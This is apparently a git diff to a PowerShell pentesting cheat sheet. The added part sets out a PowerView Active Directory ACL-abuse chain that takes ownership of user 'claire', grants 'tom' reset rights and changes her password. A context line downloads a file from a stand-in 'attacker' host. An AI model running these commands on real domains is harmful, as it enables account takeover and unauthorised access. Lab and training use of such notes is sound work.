@@ -1,5 +1,7 @@
 # PowerShell-Fu
 
+As always everything that we need is in the [documentation](https://docs.microsoft.com/en-us/powershell/scripting/how-to-use-docs?view=powershell-5.1).
+
 ## PowerShell Basics
 
 PowerShell is the successor to [command.com](https://en.wikipedia.org/wiki/COMMAND.COM), [cmd.exe](https://en.wikipedia.org/wiki/Cmd.exe), and [cscript](https://en.wikipedia.org/wiki/Windows\_Script\_Host). Initially released as a separate download, it is now built into all modern versions of Microsoft Windows. PowerShell syntax takes the form of verb-noun patterns implemented in [cmdlets](https://docs.microsoft.com/en-us/powershell/scripting/developer/cmdlet/cmdlet-overview?view=powershell-7.1).
@@ -648,4 +650,46 @@ Get-Process -Name "*sublime*" | Kill
 
 ```
 $webclient = (New-Object System.Net.WebClient).DownloadFile("http://attacker/file.txt", "C:\Temp\file.txt)
+```
+
+# Credentials
+
+Create credentials in PowerShell:
+
+```powershell
+$cred = ConvertTo-SecureString "qwer1234QWER!@#$" -AsPlainText -force
+```
+
+# ACLs PowerView
+
+Import PowerView in PowerShell:
+
+```powershell
+. .\PowerView.ps1
+```
+
+Set tom as the owner of claire’s ACL:
+
+```powershell
+Set-DomainObjectOwner -identity claire -OwnerIdentity tom
+```
+
+Grant tom permissions to change passwords on the ACL:
+
+```powershell
+Add-DomainObjectAcl -TargetIdentity claire -PrincipalIdentity tom -Rights ResetPassword
+```
+
+Set claire’s password:
+
+```powershell
+Set-DomainUserPassword -identity claire -accountpassword $cred
+```
+
+# Enumerate Processes
+
+Enumerate processes with `.ps1` in their name:
+
+```powershell
+Get-WmiObject Win32_Process | Where-Object {$_.CommandLine -like "*ps1"} | format-list -Property CommandLine,CreationDate
 ```
